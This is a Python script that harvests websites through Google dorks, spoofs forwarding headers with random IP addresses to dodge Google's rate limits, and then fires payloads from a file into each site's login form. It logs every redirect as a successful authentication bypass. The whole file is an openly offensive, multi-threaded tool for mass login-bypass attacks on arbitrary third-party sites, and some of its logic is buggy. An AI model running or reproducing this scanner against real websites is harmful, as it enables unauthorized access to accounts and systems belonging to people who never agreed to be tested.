import colorama
import requests as req
from bs4 import BeautifulSoup
import urllib.parse
from colorama import Fore
from time import sleep
import threading
from random import randint

colorama.init()

payloadss = open('payloads.txt','r',encoding='UTF-8')
payloads = [payload.replace('\n','') for payload in payloadss]
dork = open('dorks.txt','r').read()
dork = urllib.parse.quote(dork)
num=0
pages = int(input('How many page you want to receive ? > '))
links = []
for i in range(pages):
    while True:
        ip = f'{randint(10,255)}.{randint(10,255)}.{randint(10,255)}.{randint(10,255)}'
        header = {
            'X-Forwarded-For': ip,
            'X-Originating-IP': ip,
            'X-Remote-IP': ip,
            'X-Remote-Addr': ip,
            'X-Client-IP': ip,
            'X-Host': ip,
            'X-Forwared-Host': ip,
        }
        url = f'https://www.google.com/search?q={dork}&start={num}'
        res = req.get(url,headers=header).content
        soup = BeautifulSoup(res,'lxml')
        templinks = soup.find_all('a')
        for a in templinks:
            if a.get('href').startswith('/url?q=https://') or a.get('href').startswith('/url?q=http://') and not a.get('href') in "google":
                links.append(a.get('href').replace('url?q=','').split('&sa=')[0])
            else:
                templinks.remove(a)
        if links == []:
            print('Google Rate Limit.')
        else:
            links.remove(links[len(links)-1])
            links.remove(links[len(links)-1])
            num+=10
            break
        print(links)
linkstr = ''

for link in links:
    linkstr+=f'{link[1:]}\n'
open('links.txt','w').write(linkstr)

successs=''
print(links)
f = open('result.txt','a')
f.write('-'*80+'\n\n')
f.close()
f = open('result.txt','a')
def check():
    global links
    try:
        for link in links:
            link = link[1:]
            res = req.get(link).content
            soup = BeautifulSoup(res,'lxml')
            try:
                    method = soup.find('form').get('method')
            except:
                    method=None
            if not method == None:
                    usernameinpt = soup.find('input',attrs={'type': 'text'})
                    mailinpt = soup.find('input',attrs={'type': 'email'})
                    passwdinpt = soup.find('input',attrs={'type': 'password'})
                    for payload in payloads:
                        if method.lower() == 'post':
                            try:
                                if mailinpt == None:
                                    data = {
                                        usernameinpt.get('name'): payload,
                                        passwdinpt.get('name'): payload
                                    }
                                else:
                                    data = {
                                        usernameinpt.get('name'): payload,
                                        passwdinpt.get('name'): payload,
                                        mailinpt.get('name'): payload
                                    }
                                res = req.post(link,json=data,allow_redirects=False)
                                if res.is_redirect:
                                    print(Fore.GREEN + f'[Found]{Fore.RESET} Payload : {payload} Link : {link}')
                                    f.write(f'[Found] Payload : {payload} Link : {link}\n')
                                else:
                                    print(Fore.RED + "[Can't Found] "+Fore.RESET+link)
                            except AttributeError:
                                pass
                        for payload in payloads:
                            if method.lower == 'get':
                                try:
                                    if mailinpt == None:
                                        data = {
                                            usernameinpt.get('name'): payload,
                                            passwdinpt.get('name'): payload
                                        }
                                    else:
                                        data = {
                                            usernameinpt.get('name'): payload,
                                            passwdinpt.get('name'): payload,
                                            mailinpt.get('name'): payload
                                        }
                                    res = req.get(link,params=data,allow_redirects=False)
                                    if res.is_redirect:
                                        print(Fore.GREEN + f'[Found]{Fore.RESET} Payload : {payload} Link : {link}')
                                        f.write(f'[Found] Payload : {payload} Link : {link}\n')
                                    else:
                                        print(Fore.RED + "[Can't Found] "+Fore.RESET+link)
                                except AttributeError:
                                    pass
    except:
        pass
    exit()
for _ in range(5):
    t=threading.Thread(target=check)
    t.start()
print('Check finished successfull.')